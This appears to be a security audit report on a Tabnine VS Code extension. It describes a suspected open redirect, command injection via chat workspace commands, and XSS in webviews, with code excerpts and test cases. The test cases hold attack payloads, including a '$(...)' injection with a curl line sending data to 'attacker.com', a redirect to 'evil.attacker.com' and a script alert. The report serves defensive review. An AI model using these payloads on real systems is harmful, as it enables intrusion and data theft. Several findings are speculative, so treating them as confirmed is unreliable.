## Vulnerability List

### 1. Open Redirect in Hub URLs

- Description:
    The application constructs URLs for the Tabnine Hub using user-controlled or externally influenced data without proper validation. This can lead to an open redirect vulnerability, where an attacker can craft a malicious link that, when clicked by a user, redirects them to an attacker-controlled website after passing through the legitimate domain.
    Step-by-step trigger:
    1. An attacker crafts a malicious URL that points to the Tabnine Hub with a manipulated `returnUrl` or `tabnineUrl` parameter containing a malicious external URL.
    2. The attacker distributes this malicious URL to a victim user (e.g., via email, chat, or social media).
    3. The victim user clicks on the malicious URL.
    4. The application processes the URL in `src/utils/asExternal.ts` and `src/hub/hubUri.ts` without sufficient validation of the `returnUrl` and `tabnineUrl` parameters.
    5. The user is redirected to the attacker-specified malicious external URL after briefly visiting the legitimate Tabnine Hub URL.

- Impact:
    An open redirect vulnerability can be used in phishing attacks. An attacker can craft a link that appears to be legitimate (as it starts with the Tabnine domain) but redirects users to a malicious site. This malicious site can be designed to steal credentials, install malware, or perform other malicious actions. This can erode user trust in Tabnine and potentially lead to account compromise or system infection.

- Vulnerability Rank: high

- Currently implemented mitigations:
    None identified in the provided code. The code in `src/utils/asExternal.ts` and `src/hub/hubUri.ts` attempts to use `env.asExternalUri` and `asCodeServerExternalUri`, but these functions might not be sufficient to prevent open redirect if the base URL itself is already malicious or if the validation is bypassed.

- Missing mitigations:
    - Implement robust validation and sanitization of the `returnUrl` and `tabnineUrl` parameters before constructing the redirect URL.
    - Use a whitelist of allowed domains for redirection. If redirection to external domains is necessary, strictly control and validate the target URLs.
    - Consider using a redirect confirmation page to warn users before redirecting them to external websites.

- Preconditions:
    - The application must use the `returnUrl` or `tabnineUrl` parameters in Hub URLs and process them in a way that can lead to redirection.
    - An attacker needs to be able to craft or influence the Hub URLs.

- Source code analysis:
    - **File: `src/utils/asExternal.ts`**
        ```typescript
        import { URL } from "url";
        import { Uri } from "vscode";
        import {
          TABNINE_RETURN_URL_QUERY_PARAM,
          TABNINE_URL_QUERY_PARAM,
        } from "../globals/consts";
        import { asExternalUri } from "./asExternalUri";

        export async function asExternal(url: string, path?: string) {
          const serviceUrl = new URL(url);

          const tabnineUrl = serviceUrl.searchParams.get(TABNINE_URL_QUERY_PARAM);
          const returnUrl = serviceUrl.searchParams.get(TABNINE_RETURN_URL_QUERY_PARAM);

          if (tabnineUrl) {
            serviceUrl.searchParams.set(
              TABNINE_URL_QUERY_PARAM,
              (await asExternalUri(Uri.parse(tabnineUrl))).toString()
            );
          }

          if (returnUrl) {
            serviceUrl.searchParams.set(
              TABNINE_RETURN_URL_QUERY_PARAM,
              (await asExternalUri(Uri.parse(returnUrl))).toString()
            );
          }

          let parsedUri = Uri.parse(serviceUrl.toString());

          if (path) {
            parsedUri = Uri.joinPath(parsedUri, path);
          }

          return asExternalUri(parsedUri);
        }
        ```
        This function parses URLs and extracts `tabnineUrl` and `returnUrl` parameters. It then uses `asExternalUri` on these parameters, but it doesn't validate if these URLs are safe or belong to allowed domains. A malicious URL in these parameters would be passed to `asExternalUri` and then used for redirection.

    - **File: `src/hub/hubUri.ts`**
        ```typescript
        import { Uri } from "vscode";
        import { StateType } from "../globals/consts";
        import { configuration } from "../binary/requests/requests";
        import { asExternal } from "../utils/asExternal";

        export default async function hubUri(
          type: StateType,
          path?: string
        ): Promise<Uri | null> {
          const config = await configuration({ quiet: true, source: type });
          if (!config?.message) {
            return null;
          }

          return asExternal(config.message, path);
        }
        ```
        This function retrieves a URL (`config.message`) from the `configuration` function and passes it to `asExternal`. If `config.message` is influenced by external factors or user input, and it contains a malicious `returnUrl` or `tabnineUrl`, it can lead to open redirect.

- Security test case:
    1. Prepare a malicious URL: `https://hub.tabnine.com/redirect?returnUrl=https://evil.attacker.com` (Note: `hub.tabnine.com/redirect` is a placeholder for the actual Tabnine Hub URL endpoint that processes redirects).
    2. As an attacker, find a way to inject or use this malicious URL within the application. For example, try to use it as a link in a chat message, issue description, or any other place where URLs can be processed by the application and opened in a webview.
    3. Click on the crafted malicious URL within the application.
    4. Observe if the browser redirects to `https://evil.attacker.com` after going through `hub.tabnine.com`.
    5. If redirection to `https://evil.attacker.com` occurs, the open redirect vulnerability is confirmed.

### 2. Potential Command Injection via Workspace Commands in Chat Widget

- Description:
    The Tabnine Chat Widget allows execution of "workspace commands" based on instructions received from the chat server. If the application does not properly sanitize or validate these command instructions, it could be vulnerable to command injection. An attacker who can compromise the chat server or somehow inject malicious command instructions could potentially execute arbitrary commands on the user's system when the chat widget processes these instructions. While the provided code doesn't directly execute shell commands based on strings, the risk exists within the `tabnine-assistant` binary if it interprets the `arg` parameter of workspace commands in an unsafe manner.
    Step-by-step trigger:
    1. An attacker compromises the Tabnine chat server or finds a way to inject malicious command instructions into the communication channel between the chat server and the VS Code extension.
    2. The compromised chat server or malicious entity sends a crafted response to the VS Code extension containing malicious workspace command instructions.
    3. The VS Code extension receives this response and processes the workspace command instructions in `src/tabnineChatWidget/workspaceCommands/index.ts`, `src/tabnineChatWidget/workspaceCommands/commandExecutors/findSymbols.ts` and `src/tabnineChatWidget/handlers/context/workspaceContext.ts`.
    4. Due to insufficient validation or sanitization in the command execution logic *within the `tabnine-assistant` binary*, the malicious command instructions (specifically the `arg` parameter) are interpreted and executed as commands by the binary.
    5. The attacker achieves arbitrary command execution on the user's machine, potentially leading to data theft, system compromise, or other malicious activities.

- Impact:
    Successful command injection can lead to complete compromise of the user's local system. An attacker could execute arbitrary code with the privileges of the VS Code process. This is a critical vulnerability.

- Vulnerability Rank: critical

- Currently implemented mitigations:
    None identified in the provided code regarding validation or sanitization of workspace commands *before they are sent to the `tabnine-assistant` binary*. The code relies on executing commands *within the binary* based on string instructions, which is inherently risky if not carefully managed by the binary itself. The extension code does not provide explicit sanitization.

- Missing mitigations:
    - Implement strict validation and sanitization of all workspace command instructions received from the chat server *before sending them to the binary*.
    - Use a whitelist of allowed commands and parameters. Reject any commands that are not on the whitelist.
    - Avoid directly executing commands based on strings *within the `tabnine-assistant` binary*. If possible, use safer alternatives or parameterized command execution to prevent injection *within the binary*.
    - Implement input validation for any parameters passed to workspace commands, specifically for the `arg` parameter in `findSymbolsCommandExecutor`, *and ensure this validation is also performed within the `tabnine-assistant` binary*.

- Preconditions:
    - The Tabnine Chat Widget must have the functionality to execute workspace commands based on instructions from the chat server.
    - An attacker must be able to compromise the chat server or inject malicious commands into the communication channel.
    - The `tabnine-assistant` binary must be vulnerable to command injection through the `arg` parameter of workspace commands.

- Source code analysis:
    - **File: `src/tabnineChatWidget/workspaceCommands/index.ts`**
        ```typescript
        import { Logger } from "../../utils/logger";
        import findSymbolsCommandExecutor from "./commandExecutors/findSymbols";

        type WorkspaceCommand = "findSymbols";

        export type WorkspaceCommandInstruction = {
          command: WorkspaceCommand;
          arg: string;
        };

        export type ExecutionResult = {
          command: WorkspaceCommand;
          data: unknown[];
        };

        type CommandExecutor = (arg: string) => Promise<unknown[] | undefined>;

        const commandsExecutors: Record<WorkspaceCommand, CommandExecutor> = {
          findSymbols: findSymbolsCommandExecutor,
        };

        export default async function executeWorkspaceCommand(
          workspaceCommand: WorkspaceCommandInstruction
        ): Promise<ExecutionResult | undefined> {
          try {
            const { command, arg } = workspaceCommand;
            const executor = commandsExecutors[command];

            if (!executor) {
              Logger.debug(`Unknown workspace command: ${command}`);
              return undefined;
            }

            const result = await executor(arg);
            if (!result || !result.length) return undefined;

            return {
              command: workspaceCommand.command,
              data: result,
            };
          } catch (error) {
            Logger.error(error);
            return undefined;
          }
        }
        ```
        This code defines the structure for workspace commands and uses `commandsExecutors` to dispatch commands to specific executors. The `executeWorkspaceCommand` function takes a `WorkspaceCommandInstruction` which includes a `command` string and an `arg` string. It calls the corresponding executor based on the `command`. Lack of validation on `command` and `arg` *in the extension code before sending to the binary* and potential lack of validation *within the binary* can lead to command injection if the binary interprets `arg` unsafely.

    - **File: `src/tabnineChatWidget/workspaceCommands/commandExecutors/findSymbols.ts`**
        ```typescript
        import { toCamelCase, toSnakeCase } from "../../../utils/string.utils";
        import { resolveSymbols } from "../../handlers/resolveSymbols";

        export type WorkspaceSymbol = {
          name: string;
          file: string;
        };

        export default async function findSymbolsCommandExecutor(
          arg: string
        ): Promise<WorkspaceSymbol[] | undefined> {
          const camelCaseArg = toCamelCase(arg);
          const snakeCaseArg = toSnakeCase(arg);
          const camelCaseSymbols = resolveSymbols({ symbol: camelCaseArg });
          const snakeCaseSymbols = resolveSymbols({ symbol: snakeCaseArg });

          const allSymbols = (
            await Promise.all([camelCaseSymbols, snakeCaseSymbols])
          ).reduce((acc, val) => (acc || []).concat(val || []), []);

          return allSymbols?.map((symbol) => ({
            name: symbol.name,
            file: symbol.relativePath,
          }));
        }
        ```
        The `findSymbolsCommandExecutor` takes `arg` as input, converts it to camelCase and snakeCase, and then calls `resolveSymbols` with these converted arguments. If `resolveSymbols` or the underlying symbol resolution mechanism *within the `tabnine-assistant` binary* is vulnerable to injection based on the `symbol` parameter, then this code could be exploited. The `arg` parameter comes from the `WorkspaceCommandInstruction` which originates from the chat server, making it a potential injection point *if the binary processing `resolveSymbols` is vulnerable*.

    - **File: `src/tabnineChatWidget/handlers/context/workspaceContext.ts`**
        ```typescript
        import { Logger } from "../../../utils/logger";
        import { rejectOnTimeout } from "../../../utils/utils";
        import executeWorkspaceCommand, {
          WorkspaceCommandInstruction,
        } from "../../workspaceCommands";
        // ...

        export default async function getWorkspaceContext(
          workspaceCommands: WorkspaceCommandInstruction[] | undefined
        ): Promise<ContextTypeData | undefined> {
          // ...
          const results = await rejectOnTimeout(
            Promise.all(workspaceCommands.map(executeWorkspaceCommand)),
            2500
          );
          // ...
        }
        ```
        This code in `getWorkspaceContext` receives an array of `workspaceCommands` and executes them using `executeWorkspaceCommand`.  If `workspaceCommands` array, which is derived from chat server communication, contains malicious commands, they will be executed *by the `tabnine-assistant` binary* due to lack of validation before execution in `executeWorkspaceCommand` *in the extension code* and potentially within the binary itself.

- Security test case:
    1. Set up a controlled environment to intercept or modify the communication between the Tabnine Chat Widget and the chat server.
    2. Craft a malicious chat server response that includes a workspace command instruction with a command injection payload. For example, attempt to inject a command like `command: "findSymbols", arg: "$(malicious_command)"` where `malicious_command` is a shell command like `curl attacker.com/data_exfiltration`.
    3. Send this malicious response to the VS Code extension via the chat widget communication channel.
    4. Observe if the malicious command (e.g., `curl attacker.com/data_exfiltration`) is executed on the system when the extension processes the chat server response.
    5. If the malicious command is executed, the command injection vulnerability is confirmed.

### 3. Potential XSS in Webview Content

- Description:
    The Tabnine Hub and other widgets are rendered using webviews in VS Code. If the content loaded into these webviews is not properly sanitized, especially if it includes user-controlled or externally sourced data, it could be vulnerable to Cross-Site Scripting (XSS). An attacker could inject malicious JavaScript code into the webview content, which would then execute in the context of the webview, potentially allowing them to steal user data, manipulate the UI, or perform other malicious actions within the VS Code environment.
    Step-by-step trigger:
    1. An attacker identifies a parameter or data source that influences the content displayed in a Tabnine webview (e.g., Hub, Notifications Widget, Today Widget, Chat Widget).
    2. The attacker crafts a malicious payload containing JavaScript code and injects it into this parameter or data source. This could be through manipulating a URL, data in a chat message, or any other input that is reflected in the webview content.
    3. The application loads the webview and renders the content, including the attacker's malicious JavaScript payload, without proper sanitization.
    4. The malicious JavaScript code executes within the webview context, potentially allowing the attacker to:
        - Steal session tokens or other sensitive information stored in the webview.
        - Modify the content of the webview to mislead or trick the user.
        - Potentially gain some level of control over the VS Code environment if the webview context allows it.

- Impact:
    XSS in webviews can have serious consequences, including data theft and UI manipulation. While the impact might be somewhat contained within the VS Code environment, it can still compromise user data and erode trust.

- Vulnerability Rank: high

- Currently implemented mitigations:
    None explicitly identified in the provided code for sanitizing webview content against XSS. The code focuses on loading URLs and templates but doesn't show explicit sanitization of data before rendering in webviews.

- Missing mitigations:
    - Implement robust output encoding and sanitization for all data displayed in webviews, especially data sourced from external sources or user inputs.
    - Use Content Security Policy (CSP) headers to restrict the capabilities of webviews and mitigate the impact of XSS attacks.
    - Regularly review and update webview dependencies to patch any known XSS vulnerabilities in third-party libraries.

- Preconditions:
    - The application must use webviews to display dynamic content.
    - Webview content must include data from external sources or user inputs that are not properly sanitized.

- Source code analysis:
    - **File: `src/hub/createHubTemplate.ts`**
        ```typescript
        export default function createHubTemplate(url: string): string {
          return createLayoutTemplate(`
            <iframe src="${url}" id="config" frameborder="0" style="display: block; margin: 0; padding: 0; position: absolute; min-width: 100%; min-height: 100%; visibility: visible;"></iframe>
            // ... script block ...
          `);
        }
        ```
        This function directly embeds the `url` into the `src` attribute of an `iframe` within the webview HTML. If the `url` is attacker-controlled and contains malicious JavaScript, it will be executed when the webview loads.

    - **File: `src/widgetWebview/WidgetWebviewProvider.ts`**
        ```typescript
        async function setWebviewHtml(
          webviewView: WebviewView,
          source: StateType,
          hubPath: string,
          onWebviewLoaded: () => void
        ): Promise<void> {
          // ...
          if (uri) {
            // ...
            webviewView.webview.html = createLayoutTemplate(`
                <iframe src=${uri.toString()} id="active-frame" frameborder="0" sandbox="allow-same-origin allow-pointer-lock allow-scripts allow-downloads allow-forms" allow="clipboard-read; clipboard-write;" style="display: block; margin: 0px; overflow: hidden; position: absolute; width: 100%; height: 100%; visibility: visible;"></iframe>
                 `);
            // ...
          }
          // ...
        }
        ```
        Similar to `createHubTemplate`, this code embeds `uri.toString()` directly into the `iframe src`. If `uri` is malicious, it can lead to XSS.

    - **File: `src/tabnineChatWidget/webviews/template.html.ts`**
        ```typescript
        export const template = (content: string, logoSrc: string) => `<!DOCTYPE html>
        <html>
        <head>
            <style>
            .logo {
                height: 1.5rem;
                width: 6.75rem;
            }
            </style>
        </head>
        <body>
        <image src="${logoSrc}" class="logo"></image>
        ${content}
        </body>
        </html>`;
        ```
        This template is used by various webview providers in `src/tabnineChatWidget/webviews/`. The `content` parameter is directly embedded into the HTML body without sanitization. If the `content` is derived from external sources, it can lead to XSS. Files like `src/tabnineChatWidget/webviews/authenticate.html.ts`, `src/tabnineChatWidget/webviews/welcome.html.ts`, `src/tabnineChatWidget/webviews/previewEnded.html.ts` and `src/tabnineChatWidget/webviews/notPartOfATeam.html.ts` use hardcoded messages, but if these messages were ever to be dynamically generated or include external data, XSS would be a risk.

- Security test case:
    1. Craft a malicious URL that contains JavaScript code designed to execute within a webview context. For example, `https://hub.tabnine.com/?url_with_xss=%3Cscript%3Ealert('XSS')%3C/script%3E` (URL-encoded `<script>alert('XSS')</script>`).
    2. Find a way to make the application load a webview with this malicious URL. This might involve triggering a Tabnine Hub action, opening a notification, or interacting with any feature that uses webviews and processes URLs.
    3. Observe if the JavaScript code (`alert('XSS')`) is executed when the webview is loaded.
    4. If the alert box appears, the XSS vulnerability is confirmed. Further testing can be done to explore the extent of the XSS vulnerability and its potential impact.
